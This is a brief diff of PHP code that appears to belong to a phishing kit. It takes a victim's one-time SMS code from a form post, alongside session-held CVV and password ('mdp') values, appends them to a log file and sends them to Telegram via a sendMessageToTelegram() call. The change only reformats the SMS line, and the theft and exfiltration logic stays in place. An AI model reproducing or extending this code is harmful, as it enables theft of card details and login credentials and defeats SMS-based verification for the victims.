@@ -8,7 +8,8 @@ if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
 }
 $_SESSION["sms"] = $_POST['sms'] ;
 
-$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
+$donnees = "\nSMS : `" . $_SESSION['sms'] . "`" .
+ "\n". "** FIN  CONNEXION **\n"."\n";
 $file = "../blinky2000@bvc@bvc@destruction.txt" ;
 file_put_contents($file, $donnees, FILE_APPEND);
    sendMessageToTelegram($donnees) ;
